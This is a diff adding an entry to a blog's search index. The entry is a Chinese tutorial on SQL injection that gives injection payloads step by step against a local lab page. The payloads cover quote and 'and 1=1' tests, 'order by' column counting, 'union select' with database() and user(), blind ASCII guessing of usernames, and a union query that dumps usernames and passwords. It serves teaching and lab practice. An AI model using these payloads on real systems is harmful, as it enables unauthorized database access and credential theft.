@@ -3,6 +3,31 @@
   
     
     <entry>
+      <title>SQL注入</title>
+      <link href="/2018/12/21/sqlzhuru/"/>
+      <url>/2018/12/21/sqlzhuru/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1、SQL注入的概述"><a href="#1、SQL注入的概述" class="headerlink" title="1、SQL注入的概述"></a>1、SQL注入的概述</h3><p>定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><h3 id="2、SQL注入的危害"><a href="#2、SQL注入的危害" class="headerlink" title="2、SQL注入的危害"></a>2、SQL注入的危害</h3><p>● 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</p><p>●网页篡改：通过操作数据库对特定网页进行篡改。</p><p>●网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</p><p>●数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</p><p>●服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p><p>●破坏硬盘数据，瘫痪全系统。</p><h3 id="3、SQL注入攻击的典型手段"><a href="#3、SQL注入攻击的典型手段" class="headerlink" title="3、SQL注入攻击的典型手段"></a>3、SQL注入攻击的典型手段</h3><p>●判断应用程序是否存在注入漏洞</p><p>●收集信息、并判断数据库类型</p><p>●根据注入参数类型，重构SQL语句的原貌</p><p>●猜解表名、字段名</p><p>●获取账户信息、攻击web或为下一步攻击做准备</p><h3 id="3、SQL注入测试"><a href="#3、SQL注入测试" class="headerlink" title="3、SQL注入测试"></a>3、SQL注入测试</h3><p>假设我们在浏览器中输入URL www.baidu.com，由于它只是对页面的简单请求无需对数据库动进行动态请求，所以它不存在SQL注入。</p><p>当我们输入www.baidu.com?id=23时，我们在URL中传递变量id，并且提供值为23，由于它是对数据库进行动态查询的请求（其中?id＝23表示数据库查询变量 ?的作用是将地址跟数据分割开来），所以我们可以该URL中嵌入恶意SQL语句d＝23表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。</p><p>这里我使用本地搭建的环境来实验，环境在下面我会提供下载地址</p><p>访问本地地址127.0.0.1/?id=2然后传入id为2返回了,账号,密码以及id。</p><p><img src="https://i.loli.net/2018/12/21/5c1cd670802b2.png" alt="1.png"></p><p>我们在链接后面加上单引号’报错</p><p><img src="https://i.loli.net/2018/12/21/5c1cd72f2779c.png" alt="2.png"></p><p>接着我们在链接后面加上 and 1=1  and 是和的意思,需要两个都为真，真真得真,需要前面的链接存在并且后面也要为真1=1是成立的所以返回真就会返回正常页面。</p><p><img src="https://i.loli.net/2018/12/21/5c1cd81aa6df1.png" alt="3.png"></p><p>接着我们URL在后面加上and 1=2 ,因为and 1=2,是不成立的返回是假所以页面返回错误。</p><p><img src="https://i.loli.net/2018/12/21/5c1cd88cb7c52.png" alt="4.png"></p><p>那么可以判断这个链接存在sql注入。</p><h3 id="4、sql利用"><a href="#4、sql利用" class="headerlink" title="4、sql利用"></a>4、sql利用</h3><p>当检测出存在sql漏洞时我们可以选择使用工具或者手工进行注入,我这边演示用手工。</p><p>在链接后面加上 order by 3 返回成功 </p><p><img src="https://i.loli.net/2018/12/21/5c1cda6a6e298.png" alt="5.png"></p><p>在链接后面加上 order by 4 返回失败  那么就是3 这个需要大家自己去测 </p><p><img src="https://i.loli.net/2018/12/21/5c1cdab198895.png" alt="6.png"></p><p>接下来在链接后面加上 union select 1,2,3 因为是3列所以1,2,3</p><p><img src="https://i.loli.net/2018/12/21/5c1cdb28454f5.png" alt="7.png"></p><p>可以看到多出了一行并且返回了 2 3代表2跟3是可以提换的</p><p>接下来我们把2替换成database()查看当前数据库，把3替换成user()查看当前用户 version()是查看数据库版本</p><p>可以看到原来是2的地方返回了数据库的名字,原来是3的地方返回了当前用户</p><p><img src="https://i.loli.net/2018/12/21/5c1cdbf23eaed.png" alt="8.png"></p><p>数据库的组成,一个库里面有好多表，比如mo3这个库里面有user这个表,表里面有字段,比如有id,username,password，字段里面有数据比如username字段里面放着就是用户名,password字段里面放着的就是密码</p><p>猜表名 接着在url后面加上and (select count(*) from 表的名字) 如果返回正常就代表存在这个表，尝试admin看看有没有这个表，返回失败不存在这个表</p><p><img src="https://i.loli.net/2018/12/21/5c1cddc7b0675.png" alt="9.png"></p><p>接下来在试user，返回正常存在这个表</p><p><img src="https://i.loli.net/2018/12/21/5c1cde04d4519.png" alt="10.png"></p><p>猜字段   and (select count(字段名) from 上行语句猜到的表名)&gt;=0 因为我这边知道了字段演示一下就好,这样就得到了username跟password字段</p><p><img src="https://i.loli.net/2018/12/21/5c1ce02f98c8b.png" alt="11.png"></p><p><img src="https://i.loli.net/2018/12/21/5c1ce02fef7b1.png" alt="12.png"></p><p>猜字段的位数</p><p>and (select top 1 len (字段) from 表名) &gt;0</p><p>and (select top 1 len (username) from user) &gt;4 返回正常 &gt;5 返回错误，想想 一个数字大于4小于5是什么？没错就是5！</p><p>猜Ascii码的字段值(不懂Ascii码的可以百度，了解一些就可以了)</p><p>and (select top 1 asc (mid (字段,位数,1)) from 表名) &gt;ascii（1~128）</p><p> and (select top 1asc (mid (username,1,1)) from user) &gt;96 返回正常 97返回错误 那么这个user表里面的第一个ascii码就是97了 ascii码对应的就是字母a</p><p>user字段里面的第一位已经被猜出来了 是a 对应的ascii码是97 </p><p>接着猜第二位</p><p>and (select top 1asc (mid (username,2,1)) from user) &gt;99 返回正常 100返回错误 ascii码为100</p><p>100对应的是字母d</p><p>接着猜第三位</p><p>and (select top 1asc (mid (username,3,1)) from user) &gt;108 返回正常 109 返回错误 ascii码为109</p><p>109对应的是字母m</p><p>接着猜第四位</p><p>and (select top 1asc (mid (username,4,1)) from user) &gt;104 返回正常 105返回错误 ascii码是105</p><p>105对应的是字母i</p><p>接着猜第五位</p><p>and (select top 1asc (mid (username,5,1)) from user) &gt;109 返回正常 110返回错误 ascii码为110</p><p>110对应的是字母n</p><hr><p>Ascii:97 100 109 105 110</p><p>对应的字母:  a     d       m      i     n</p><p>当然还有一种方法比较快,当你知道了表名和字段的时候可以使用我们前面使用的联合查询法 union select 1,2,3 from 表名  1,2,3是因为上面猜出来有3列,在查询出第2列第3列是可以替换的我们就可以将2,3替换成字段名就成了这样union select 1,username,password from user 这样就得到了用户的账号密码</p><p><img src="https://i.loli.net/2018/12/21/5c1ce4b0eb18e.png" alt="15.png"></p><p>接下来提供一下环境的下载,如果嫌文件太大的话我这边提供数据库文件跟php代码。下载链接    <a href="https://pan.baidu.com/s/1YLlxX44ILk_o3KFL9HiOrg" target="_blank" rel="external">https://pan.baidu.com/s/1YLlxX44ILk_o3KFL9HiOrg</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web漏洞 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>黑客术语</title>
       <link href="/2018/11/26/hackshuyu/"/>
       <url>/2018/11/26/hackshuyu/</url>
